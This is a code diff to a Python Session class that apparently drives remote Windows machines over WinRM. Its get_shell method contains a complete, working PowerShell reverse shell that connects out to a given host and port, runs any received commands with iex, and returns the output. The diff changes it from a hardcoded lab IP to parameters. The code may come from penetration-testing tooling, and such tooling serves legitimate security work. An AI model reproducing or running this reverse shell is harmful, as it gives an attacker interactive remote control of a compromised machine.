@@ -31,9 +31,9 @@ class Session(object):
             f.write(struct.pack('{}s'.format(data_length), data))
 
     def get_shell(self, host: str, port: int):
-        command = "$client = New-Object Net.Sockets.TCPClient('192.168.70.129',12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-        # content = command.format(host, port)
-        std_out, std_err, status_code = self.run_ps(command)
+        command = ["$client = New-Object Net.Sockets.TCPClient('", host, "',", str(port) ,");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"]
+        content = "".join(command)
+        std_out, std_err, status_code = self.run_ps(content)
 
     def run_cmd(self, command, args=()):
         shell_id = self.protocol.open_shell()
@@ -67,4 +67,3 @@ class Session(object):
         if not path:
             path = 'wsman'
         return '{0}://{1}:{2}/{3}'.format(scheme, host, port, path.lstrip('/'))
-
